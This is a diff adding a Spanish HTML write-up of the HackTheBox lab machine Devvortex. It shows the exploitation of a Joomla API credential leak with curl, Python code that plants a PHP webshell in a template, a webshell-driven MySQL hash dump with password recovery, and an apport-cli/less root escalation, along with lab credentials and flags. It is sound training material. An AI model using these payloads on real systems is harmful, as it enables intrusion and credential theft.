@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB — Devvortex | Ghost-Ops Report</title>
+<style>
+:root {
+  --accent: #4ade80;
+  --accent-dim: #16a34a;
+  --accent-glow: rgba(74,222,128,0.15);
+  --bg: #0a0e1a;
+  --bg2: #0f1629;
+  --bg3: #141d35;
+  --card: #111827;
+  --card2: #1a2540;
+  --border: #1e2d4a;
+  --text: #e2e8f0;
+  --text-muted: #64748b;
+  --text-dim: #94a3b8;
+  --red: #f87171;
+  --yellow: #fbbf24;
+  --blue: #60a5fa;
+  --purple: #a78bfa;
+  --orange: #fb923c;
+  --cyan: #22d3ee;
+  --green: #4ade80;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.6; }
+a { color: var(--accent); text-decoration: none; }
+
+/* HERO */
+.hero {
+  background: linear-gradient(135deg, #0a0e1a, #0d1a2b, #091a10);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+  border-bottom: 1px solid var(--border);
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: radial-gradient(ellipse at 30% 50%, rgba(74,222,128,0.07) 0%, transparent 60%),
+              radial-gradient(ellipse at 80% 20%, rgba(96,165,250,0.05) 0%, transparent 50%);
+}
+.hero-watermark {
+  position: absolute; right: 40px; top: 50%; transform: translateY(-50%);
+  font-size: 280px; font-weight: 900; color: var(--accent); opacity: 0.04;
+  line-height: 1; user-select: none; font-family: monospace;
+}
+.hero-content { position: relative; z-index: 1; max-width: 800px; }
+.tags-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 18px; }
+.tag { padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; }
+.tag-platform { background: rgba(74,222,128,0.15); color: var(--green); border: 1px solid rgba(74,222,128,0.3); }
+.tag-easy { background: rgba(74,222,128,0.15); color: var(--green); border: 1px solid rgba(74,222,128,0.3); }
+.tag-os { background: rgba(167,139,250,0.15); color: var(--purple); border: 1px solid rgba(167,139,250,0.3); }
+.tag-pwned { background: rgba(74,222,128,0.2); color: var(--green); border: 1px solid var(--accent); }
+.tag-cve { background: rgba(248,113,113,0.15); color: var(--red); border: 1px solid rgba(248,113,113,0.3); }
+.hero h1 { font-size: 48px; font-weight: 800; letter-spacing: -1px; margin-bottom: 10px; }
+.hero h1 span { color: var(--accent); }
+.hero-sub { color: var(--text-dim); font-size: 16px; margin-bottom: 28px; }
+.hero-stats { display: flex; gap: 32px; flex-wrap: wrap; }
+.hero-stat { }
+.hero-stat .hs-val { font-size: 22px; font-weight: 700; color: var(--accent); font-family: monospace; }
+.hero-stat .hs-lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+
+/* QUICK STATS */
+.quick-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; padding: 28px 40px; background: var(--bg2); border-bottom: 1px solid var(--border); }
+.qs-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; text-align: center; }
+.qs-num { font-size: 32px; font-weight: 800; color: var(--accent); font-family: monospace; }
+.qs-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; margin-top: 4px; }
+
+/* LAYOUT */
+.container { display: grid; grid-template-columns: 1fr 300px; gap: 32px; padding: 32px 40px; max-width: 1400px; margin: 0 auto; }
+.main-col { min-width: 0; }
+.sidebar { }
+
+/* SECTIONS */
+.section { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 28px; margin-bottom: 24px; }
+.section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+.section-number { width: 30px; height: 30px; background: var(--accent); color: #000; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
+.section-header h2 { font-size: 20px; font-weight: 700; color: var(--text); }
+p { color: var(--text-dim); margin-bottom: 12px; line-height: 1.7; }
+
+/* CODE BLOCKS */
+.code-block { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 16px 0; font-family: 'Fira Code', 'Cascadia Code', monospace; }
+.code-label { background: var(--bg3); padding: 6px 14px; font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; border-bottom: 1px solid var(--border); }
+.code-body { padding: 16px; font-size: 13px; line-height: 1.7; overflow-x: auto; white-space: pre; }
+.cmd { color: var(--green); }
+.param { color: var(--cyan); }
+.ip { color: var(--orange); }
+.user { color: var(--purple); }
+.path { color: var(--blue); }
+.comment { color: var(--text-muted); }
+.success { color: var(--green); font-weight: 600; }
+.highlight { color: var(--red); font-weight: 600; }
+.flag-hl { color: var(--yellow); font-weight: 700; background: rgba(251,191,36,0.1); padding: 1px 4px; border-radius: 3px; }
+.output { color: var(--text-dim); }
+
+/* CALLOUTS */
+.callout { padding: 14px 18px; border-radius: 8px; margin: 14px 0; font-size: 14px; }
+.callout-info { background: rgba(96,165,250,0.08); border-left: 3px solid var(--blue); color: var(--text-dim); }
+.callout-warn { background: rgba(251,191,36,0.08); border-left: 3px solid var(--yellow); color: var(--text-dim); }
+.callout-danger { background: rgba(248,113,113,0.08); border-left: 3px solid var(--red); color: var(--text-dim); }
+.callout-tip { background: rgba(74,222,128,0.08); border-left: 3px solid var(--green); color: var(--text-dim); }
+.callout strong { display: block; font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
+.callout-info strong { color: var(--blue); }
+.callout-warn strong { color: var(--yellow); }
+.callout-danger strong { color: var(--red); }
+.callout-tip strong { color: var(--green); }
+
+/* VULN CARDS */
+.vuln-card { background: var(--card2); border: 1px solid var(--border); border-left: 4px solid var(--red); border-radius: 0 8px 8px 0; padding: 18px 20px; margin: 16px 0; }
+.vuln-title { font-weight: 700; color: var(--text); margin-bottom: 6px; font-size: 15px; }
+.vuln-meta { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 8px; }
+.badge { padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
+.badge-red { background: rgba(248,113,113,0.12); color: var(--red); }
+.badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); }
+.badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); }
+.badge-cyan { background: rgba(34,211,238,0.12); color: var(--cyan); }
+.badge-green { background: rgba(74,222,128,0.12); color: var(--green); }
+.badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); }
+.badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); }
+.vuln-desc { color: var(--text-dim); font-size: 14px; }
+
+/* TIMELINE */
+.timeline { padding-left: 28px; position: relative; }
+.timeline::before { content: ''; position: absolute; left: 10px; top: 0; bottom: 0; width: 2px; background: var(--border); }
+.tl-item { position: relative; margin-bottom: 24px; }
+.tl-dot { position: absolute; left: -24px; top: 4px; width: 12px; height: 12px; border-radius: 50%; border: 2px solid var(--accent); background: var(--bg); }
+.tl-dot.red { border-color: var(--red); }
+.tl-dot.blue { border-color: var(--blue); }
+.tl-dot.yellow { border-color: var(--yellow); }
+.tl-time { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
+.tl-title { font-weight: 600; color: var(--text); margin-bottom: 4px; }
+.tl-desc { font-size: 13px; color: var(--text-dim); }
+
+/* FLAG BOX */
+.flag-box { background: linear-gradient(135deg, rgba(74,222,128,0.05), rgba(74,222,128,0.1)); border: 1px solid rgba(74,222,128,0.3); border-radius: 10px; padding: 20px 24px; margin: 16px 0; display: flex; align-items: center; gap: 16px; }
+.flag-icon { font-size: 32px; }
+.flag-label { font-size: 11px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.06em; font-weight: 600; }
+.flag-value { font-family: monospace; font-size: 16px; color: var(--yellow); font-weight: 700; }
+
+/* REC GRID */
+.rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-top: 16px; }
+.rec-card { background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
+.rec-priority { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }
+.rec-priority.critical { color: var(--red); }
+.rec-priority.high { color: var(--orange); }
+.rec-priority.medium { color: var(--yellow); }
+.rec-card h4 { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
+.rec-card p { font-size: 13px; }
+
+/* STEP BOX */
+.step-box { background: var(--card2); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin: 18px 0; }
+.step-num { display: inline-flex; align-items: center; justify-content: center; width: 26px; height: 26px; background: var(--accent); color: #000; border-radius: 50%; font-size: 12px; font-weight: 800; margin-right: 8px; }
+.step-title { font-weight: 700; font-size: 16px; color: var(--text); margin-bottom: 12px; }
+.why-box { background: rgba(96,165,250,0.05); border-left: 3px solid var(--blue); padding: 10px 14px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+.why-box .why-label { font-size: 10px; font-weight: 700; color: var(--blue); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 4px; }
+.interpret-box { background: rgba(74,222,128,0.05); border-left: 3px solid var(--green); padding: 10px 14px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+.interpret-box .int-label { font-size: 10px; font-weight: 700; color: var(--green); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 4px; }
+.decision-box { background: rgba(251,146,60,0.05); border-left: 3px solid var(--orange); padding: 10px 14px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+.decision-box .dec-label { font-size: 10px; font-weight: 700; color: var(--orange); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 4px; }
+
+/* SIDEBAR */
+.sidebar-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 18px; }
+.sidebar-card h3 { font-size: 13px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 14px; }
+.info-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
+.info-row:last-child { border-bottom: none; }
+.info-key { color: var(--text-muted); }
+.info-val { color: var(--text); font-family: monospace; font-size: 12px; }
+.tool-list { list-style: none; }
+.tool-list li { padding: 5px 0; font-size: 13px; color: var(--text-dim); border-bottom: 1px solid rgba(30,45,74,0.5); }
+.tool-list li:last-child { border-bottom: none; }
+.tool-list li::before { content: '→'; color: var(--accent); margin-right: 8px; font-size: 11px; }
+.toc-list { list-style: none; }
+.toc-list li { padding: 4px 0; }
+.toc-list a { font-size: 13px; color: var(--text-dim); transition: color 0.2s; }
+.toc-list a:hover { color: var(--accent); }
+.mitre-item { display: flex; align-items: flex-start; gap: 10px; padding: 7px 0; border-bottom: 1px solid var(--border); }
+.mitre-item:last-child { border-bottom: none; }
+.mitre-id { font-family: monospace; font-size: 11px; color: var(--accent); font-weight: 700; white-space: nowrap; }
+.mitre-name { font-size: 12px; color: var(--text-dim); }
+.sidebar-sticky { position: sticky; top: 24px; }
+
+/* ARTIFACT */
+.artifact-card { display: flex; align-items: flex-start; gap: 12px; padding: 12px; background: var(--bg3); border-radius: 8px; margin: 8px 0; }
+.artifact-icon { font-size: 22px; flex-shrink: 0; }
+.artifact-name { font-family: monospace; font-size: 13px; color: var(--accent); font-weight: 600; }
+.artifact-desc { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
+
+/* ATTACK CHAIN */
+.attack-chain { display: flex; align-items: center; gap: 0; flex-wrap: wrap; margin: 18px 0; }
+.chain-step { background: var(--card2); border: 1px solid var(--border); border-radius: 6px; padding: 10px 14px; font-size: 12px; text-align: center; }
+.chain-step .cs-title { font-weight: 700; color: var(--text); font-size: 12px; }
+.chain-step .cs-sub { color: var(--text-muted); font-size: 11px; margin-top: 2px; }
+.chain-arrow { color: var(--accent); font-size: 18px; margin: 0 4px; }
+
+/* FOOTER */
+footer { background: var(--bg2); border-top: 1px solid var(--border); padding: 24px 40px; text-align: center; color: var(--text-muted); font-size: 13px; }
+footer span { color: var(--accent); }
+
+/* TABLES */
+table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; }
+th { background: var(--bg3); padding: 9px 12px; text-align: left; font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-muted); border-bottom: 1px solid var(--border); }
+td { padding: 8px 12px; border-bottom: 1px solid rgba(30,45,74,0.4); color: var(--text-dim); }
+tr:last-child td { border-bottom: none; }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-watermark">&gt;</div>
+  <div class="hero-content">
+    <div class="tags-row">
+      <span class="tag tag-platform">HackTheBox</span>
+      <span class="tag tag-easy">Easy</span>
+      <span class="tag tag-os">Linux</span>
+      <span class="tag tag-cve">CVE-2023-23752</span>
+      <span class="tag tag-cve">CVE-2023-1326</span>
+      <span class="tag tag-pwned">✓ Pwned</span>
+    </div>
+    <h1><span>Devvortex</span> — HTB Report</h1>
+    <p class="hero-sub">Joomla 4.2.6 unauthenticated API credential leak → PHP webshell injection → privilege escalation via apport-cli</p>
+    <div class="hero-stats">
+      <div class="hero-stat">
+        <div class="hs-val">10.129.229.146</div>
+        <div class="hs-lbl">Target IP</div>
+      </div>
+      <div class="hero-stat">
+        <div class="hs-val">Ubuntu 20.04.6</div>
+        <div class="hs-lbl">OS</div>
+      </div>
+      <div class="hero-stat">
+        <div class="hs-val">~40 min</div>
+        <div class="hs-lbl">Total Time</div>
+      </div>
+      <div class="hero-stat">
+        <div class="hs-val">2026-03-21</div>
+        <div class="hs-lbl">Date</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- QUICK STATS -->
+<div class="quick-stats">
+  <div class="qs-card">
+    <div class="qs-num">2</div>
+    <div class="qs-label">CVEs Exploited</div>
+  </div>
+  <div class="qs-card">
+    <div class="qs-num">3</div>
+    <div class="qs-label">Phases</div>
+  </div>
+  <div class="qs-card">
+    <div class="qs-num">2</div>
+    <div class="qs-label">Flags Captured</div>
+  </div>
+  <div class="qs-card">
+    <div class="qs-num">100%</div>
+    <div class="qs-label">Pwned</div>
+  </div>
+</div>
+
+<!-- MAIN GRID -->
+<div class="container">
+<div class="main-col">
+
+<!-- 1. DESCRIPTION -->
+<div class="section" id="desc">
+  <div class="section-header">
+    <div class="section-number">1</div>
+    <h2>Descripción de la Máquina</h2>
+  </div>
+  <p>Devvortex es una máquina Linux Easy de Hack The Box que demuestra el impacto real de una vulnerabilidad de divulgación de información en un CMS popular (Joomla) encadenada con una inyección de webshell en un template y una escalada de privilegios mediante un pager ejecutado con permisos de root.</p>
+  <p>El vector principal es <strong>CVE-2023-23752</strong>, una vulnerabilidad en Joomla 4.0–4.2.7 que permite a cualquier usuario no autenticado leer la configuración completa de la aplicación (incluyendo credenciales de base de datos) a través de la API REST pública. Con esas credenciales se accede al panel de administración y se inyecta un webshell PHP en el template Cassiopeia.</p>
+
+  <div class="callout callout-info">
+    <strong>Concepto clave</strong>
+    Una vulnerabilidad de "information disclosure" puede parecer de bajo impacto por sí sola, pero en este caso expone las credenciales del administrador — convirtiendo un leak de config en RCE completo.
+  </div>
+
+  <!-- ATTACK CHAIN -->
+  <div class="attack-chain">
+    <div class="chain-step"><div class="cs-title">CVE-2023-23752</div><div class="cs-sub">API info leak</div></div>
+    <div class="chain-arrow">→</div>
+    <div class="chain-step"><div class="cs-title">Joomla Admin</div><div class="cs-sub">lewis:P4ntherg0t1n5r3c0n##</div></div>
+    <div class="chain-arrow">→</div>
+    <div class="chain-step"><div class="cs-title">PHP Webshell</div><div class="cs-sub">error.php template</div></div>
+    <div class="chain-arrow">→</div>
+    <div class="chain-step"><div class="cs-title">MySQL Hash</div><div class="cs-sub">logan bcrypt</div></div>
+    <div class="chain-arrow">→</div>
+    <div class="chain-step"><div class="cs-title">SSH Logan</div><div class="cs-sub">tequieromucho</div></div>
+    <div class="chain-arrow">→</div>
+    <div class="chain-step"><div class="cs-title">CVE-2023-1326</div><div class="cs-sub">apport-cli → root</div></div>
+  </div>
+</div>
+
+<!-- 2. RECONOCIMIENTO -->
+<div class="section" id="recon">
+  <div class="section-header">
+    <div class="section-number">2</div>
+    <h2>Reconocimiento</h2>
+  </div>
+
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">1</span> Escaneo de puertos con Nmap</div>
+    <div class="why-box">
+      <div class="why-label">¿Por qué?</div>
+      El escaneo inicial revela la superficie de ataque. Con dos puertos (22 y 80) el vector es claramente HTTP.
+    </div>
+    <div class="code-block">
+      <div class="code-label">Terminal — Nmap</div>
+      <div class="code-body"><span class="cmd">nmap</span> <span class="param">-p- --open -n -T4 -sS</span> <span class="ip">10.129.229.146</span>
+<span class="comment"># Resultado: 22/tcp (SSH) y 80/tcp (HTTP)</span>
+
+<span class="cmd">nmap</span> <span class="param">-p22,80 -sC -sV</span> <span class="ip">10.129.229.146</span>
+<span class="output">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/</span></div>
+    </div>
+    <div class="interpret-box">
+      <div class="int-label">Interpretación</div>
+      nginx redirige a <code>devvortex.htb</code> — el servidor usa virtual hosts. Sin acceso a /etc/hosts, usaremos el header <code>Host:</code> en curl y la técnica <code>ForcedIPAdapter</code> en Python.
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">2</span> Enumeración de Virtual Hosts (subdominios)</div>
+    <div class="why-box">
+      <div class="why-label">¿Por qué?</div>
+      En CTFs con nginx/Apache es común que el subdominio secundario tenga funcionalidad más vulnerable que el dominio principal. <code>dev.*</code> suele ser un entorno de desarrollo con menos hardening.
+    </div>
+    <div class="code-block">
+      <div class="code-label">Gobuster — VHOST brute force</div>
+      <div class="code-body"><span class="cmd">gobuster</span> vhost <span class="param">-u</span> http://<span class="ip">10.129.229.146</span> <span class="param">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="param">-H</span> "Host: FUZZ.devvortex.htb" <span class="param">--append-domain</span>
+
+<span class="success">Found: dev.devvortex.htb (Status: 200)</span></div>
+    </div>
+    <div class="decision-box">
+      <div class="dec-label">Decisión</div>
+      El subdominio <code>dev.devvortex.htb</code> devuelve 200. Investigar ese host como objetivo principal.
+    </div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">3</span> Identificación del CMS — Joomla 4.2.6</div>
+    <div class="code-block">
+      <div class="code-label">WhatWeb / curl</div>
+      <div class="code-body"><span class="cmd">curl</span> <span class="param">-s -H</span> "Host: dev.devvortex.htb" http://<span class="ip">10.129.229.146</span>/administrator/ <span class="param">| grep -i joomla</span>
+<span class="output">&lt;meta name="generator" content="Joomla! - Open Source Content Management" /&gt;</span>
+
+<span class="comment"># Verificar versión exacta</span>
+<span class="cmd">curl</span> <span class="param">-s -H</span> "Host: dev.devvortex.htb" http://<span class="ip">10.129.229.146</span>/administrator/manifests/files/joomla.xml <span class="param">| grep version</span>
+<span class="output">&lt;version&gt;<span class="highlight">4.2.6</span>&lt;/version&gt;</span></div>
+    </div>
+    <div class="interpret-box">
+      <div class="int-label">Interpretación</div>
+      Joomla 4.2.6 es vulnerable a <strong>CVE-2023-23752</strong> — divulgación de información no autenticada vía API REST. Exactamente el vector que necesitamos.
+    </div>
+  </div>
+</div>
+
+<!-- 3. VULNERABILIDADES -->
+<div class="section" id="vulns">
+  <div class="section-header">
+    <div class="section-number">3</div>
+    <h2>Vulnerabilidades Identificadas</h2>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">CVE-2023-23752 — Joomla Unauthenticated Information Disclosure</div>
+    <div class="vuln-meta">
+      <span class="badge badge-red">CVSS 5.3 Medium</span>
+      <span class="badge badge-orange">Unauthenticated</span>
+      <span class="badge badge-cyan">Joomla 4.0–4.2.7</span>
+      <span class="badge badge-yellow">Information Disclosure → Credential Leak</span>
+    </div>
+    <div class="vuln-desc">
+      La API REST de Joomla 4.x expone el endpoint <code>/api/index.php/v1/config/application</code> que devuelve la configuración completa de la aplicación sin requerir autenticación cuando se incluye el parámetro <code>?public=true</code>. La respuesta incluye el host, usuario y contraseña de la base de datos MySQL — exactamente las mismas credenciales del administrador de Joomla.
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">Joomla Template Editor — PHP Webshell Injection (Post-Auth RCE)</div>
+    <div class="vuln-meta">
+      <span class="badge badge-red">Critical</span>
+      <span class="badge badge-orange">Authenticated Admin</span>
+      <span class="badge badge-blue">com_templates</span>
+    </div>
+    <div class="vuln-desc">
+      El editor de templates de Joomla permite a un administrador editar directamente los archivos PHP del template activo. Al modificar <code>error.php</code> del template Cassiopeia e insertar código PHP arbitrario, conseguimos ejecución remota de código como <code>www-data</code>. Este es el diseño intencionado de Joomla — el problema es que las credenciales del administrador son recuperables sin autenticación vía CVE-2023-23752.
+    </div>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-title">CVE-2023-1326 — apport-cli Privilege Escalation via Less Pager</div>
+    <div class="vuln-meta">
+      <span class="badge badge-red">CVSS 7.3 High</span>
+      <span class="badge badge-yellow">Local Privilege Escalation</span>
+      <span class="badge badge-cyan">Ubuntu 20.04 / apport &lt;2.26.0</span>
+    </div>
+    <div class="vuln-desc">
+      Cuando <code>apport-cli</code> se ejecuta con <code>sudo</code> y se elige la opción "View Report", abre el reporte de crash en el pager <code>less</code> con privilegios de root. Dado que <code>less</code> permite ejecutar comandos del sistema con <code>!</code>, es posible escapar al shell como root mediante <code>!/bin/bash</code>.
+    </div>
+  </div>
+</div>
+
+<!-- 4. TIMELINE -->
+<div class="section" id="timeline">
+  <div class="section-header">
+    <div class="section-number">4</div>
+    <h2>Timeline del Ataque</h2>
+  </div>
+  <div class="timeline">
+    <div class="tl-item">
+      <div class="tl-dot"></div>
+      <div class="tl-time">T+0:00 — Reconocimiento</div>
+      <div class="tl-title">Nmap revela puertos 22 y 80 → nginx → vhost devvortex.htb</div>
+      <div class="tl-desc">Identificación inicial de superficie de ataque. HTTP como único vector relevante.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot blue"></div>
+      <div class="tl-time">T+0:05 — VHOST Enum</div>
+      <div class="tl-title">Gobuster descubre dev.devvortex.htb</div>
+      <div class="tl-desc">Subdominio de desarrollo con Joomla 4.2.6. Versión confirmada vulnerable a CVE-2023-23752.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot red"></div>
+      <div class="tl-time">T+0:08 — CVE-2023-23752</div>
+      <div class="tl-title">API leak expone lewis:P4ntherg0t1n5r3c0n##</div>
+      <div class="tl-desc">Un solo curl al endpoint público devuelve credenciales de DB == credenciales de admin Joomla.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot"></div>
+      <div class="tl-time">T+0:15 — Joomla Admin</div>
+      <div class="tl-title">Login como lewis → panel de administración</div>
+      <div class="tl-desc">Acceso completo al backend. Template ID 223 (cassiopeia) identificado.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot red"></div>
+      <div class="tl-time">T+0:20 — Webshell</div>
+      <div class="tl-title">PHP webshell inyectado en /cassiopeia/error.php</div>
+      <div class="tl-desc">Webshell confirmado: uid=33(www-data). Ruta exacta de trigger identificada.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot blue"></div>
+      <div class="tl-time">T+0:28 — Loot MySQL</div>
+      <div class="tl-title">mysql dump via webshell → hash bcrypt de logan</div>
+      <div class="tl-desc">Hash $2y$10$IT4k5... verificado con Python bcrypt → tequieromucho.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot"></div>
+      <div class="tl-time">T+0:33 — User Flag</div>
+      <div class="tl-title">SSH como logan → user.txt</div>
+      <div class="tl-desc">3a3ee8221f9dd3225cc41d69c3cef645</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot red"></div>
+      <div class="tl-time">T+0:38 — Root Flag</div>
+      <div class="tl-title">CVE-2023-1326 → sudo apport-cli → less → !/bin/bash → root</div>
+      <div class="tl-desc">7ae0c867534cba6cf27335d3287185ef. Máquina completada.</div>
+    </div>
+  </div>
+</div>
+
+<!-- 5. EXPLOTACIÓN -->
+<div class="section" id="exploit">
+  <div class="section-header">
+    <div class="section-number">5</div>
+    <h2>Explotación Detallada</h2>
+  </div>
+
+  <!-- PASO 1: CVE -->
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">1</span> CVE-2023-23752 — API Credential Leak</div>
+    <div class="why-box">
+      <div class="why-label">¿Qué es este endpoint?</div>
+      La API REST de Joomla 4.x tiene un bug de control de acceso: el endpoint de configuración no verifica si el cliente está autenticado cuando se incluye el parámetro <code>?public=true</code>. Devuelve toda la configuración del archivo <code>configuration.php</code> en formato JSON.
+    </div>
+    <div class="code-block">
+      <div class="code-label">Explotación CVE-2023-23752</div>
+      <div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> "http://<span class="ip">10.129.229.146</span>/api/index.php/v1/config/application<span class="highlight">?public=true</span>" \
+     <span class="param">-H</span> "Host: dev.devvortex.htb" | python3 -m json.tool
+
+<span class="output">{
+  "data": [
+    {
+      "type": "application",
+      "id": "224",
+      "attributes": {
+        "dbtype": "mysqli",
+        "host": "localhost",
+        "user": "<span class="success">lewis</span>",
+        "password": "<span class="flag-hl">P4ntherg0t1n5r3c0n##</span>",
+        "db": "joomla",
+        "dbprefix": "sd4fg_"
+      }
+    }
+  ]
+}</span></div>
+    </div>
+    <div class="interpret-box">
+      <div class="int-label">Impacto</div>
+      Credenciales de base de datos = credenciales de administrador Joomla (la misma cuenta). Un atacante sin privilegios obtiene acceso completo al CMS en segundos.
+    </div>
+  </div>
+
+  <!-- PASO 2: Template Webshell -->
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">2</span> Template Editor — PHP Webshell Injection</div>
+    <div class="why-box">
+      <div class="why-label">¿Cómo funciona?</div>
+      El componente <code>com_templates</code> de Joomla permite editar los archivos PHP del template directamente desde el backend. El archivo <code>/cassiopeia/error.php</code> es procesado por PHP cuando se produce un error 404. Al prepender código PHP arbitrario, cualquier petición que cargue ese archivo ejecuta nuestro webshell.
+    </div>
+    <div class="code-block">
+      <div class="code-label">Python — ForcedIPAdapter + Template Save</div>
+      <div class="code-body"><span class="comment"># Bypass DNS sin acceso a /etc/hosts</span>
+<span class="keyword">class</span> ForcedIPAdapter(HTTPAdapter):
+    <span class="keyword">def</span> send(self, request, **kwargs):
+        parsed = urlparse(request.url)
+        request.url = urlunparse(parsed._replace(netloc=<span class="ip">"10.129.229.146"</span>))
+        <span class="keyword">return</span> super().send(request, **kwargs)
+
+<span class="comment"># File target: /cassiopeia/error.php</span>
+file_b64 = base64.b64encode(<span class="highlight">b"/cassiopeia/error.php"</span>).decode()
+<span class="comment"># = L2Nhc3Npb3BlaWEvZXJyb3IucGhw</span>
+
+<span class="comment"># Webshell payload</span>
+webshell = <span class="success">'&lt;?php if(isset($_GET["cmd"])){ echo shell_exec($_GET["cmd"]." 2&gt;&amp;1"); die(); } ?&gt;'</span>
+
+<span class="comment"># POST con campos correctos de Joomla</span>
+save_data = {
+    <span class="param">"jform[extension_id]"</span>: <span class="highlight">"223"</span>,   <span class="comment"># cassiopeia template ID</span>
+    <span class="param">"jform[source]"</span>: webshell + original_content,
+    <span class="param">"isMedia"</span>: <span class="highlight">"0"</span>,
+    <span class="param">"task"</span>: <span class="highlight">"template.apply"</span>,
+    csrf_token: <span class="highlight">"1"</span>
+}
+<span class="comment"># POST URL debe incluir view=template&amp;file=...&amp;isMedia=0</span>
+save_url = f"/administrator/index.php?option=com_templates&amp;view=template&amp;id=223&amp;file={file_b64}&amp;isMedia=0"</div>
+    </div>
+    <div class="code-block">
+      <div class="code-label">Verificación — RCE confirmado</div>
+      <div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> "http://<span class="ip">10.129.229.146</span>/templates/cassiopeia/cassiopeia/error.php?cmd=id" \
+     <span class="param">-H</span> "Host: dev.devvortex.htb"
+
+<span class="success">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
+    </div>
+  </div>
+
+  <!-- PASO 3: MySQL -->
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">3</span> Dump MySQL — Hash de logan</div>
+    <div class="code-block">
+      <div class="code-label">Webshell → MySQL query</div>
+      <div class="code-body"><span class="cmd">curl</span> <span class="param">-s</span> "http://<span class="ip">10.129.229.146</span>/templates/cassiopeia/cassiopeia/error.php" \
+     <span class="param">-H</span> "Host: dev.devvortex.htb" \
+     <span class="param">--get --data-urlencode</span> <span class="highlight">"cmd=mysql -u lewis -pP4ntherg0t1n5r3c0n## joomla -e 'select username,password from sd4fg_users;' --batch --skip-column-names"</span>
+
+<span class="output">lewis   $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
+<span class="success">logan   $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</span></span>
+
+<span class="comment"># Verificar con Python bcrypt (más rápido que john con bcrypt)</span>
+python3 -c "
+import bcrypt
+h = b'\$2y\$10\$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
+h2b = h.replace(b'\$2y\$', b'\$2b\$')
+print(bcrypt.checkpw(b'<span class="flag-hl">tequieromucho</span>', h2b))
+"
+<span class="success">True</span></div>
+    </div>
+  </div>
+
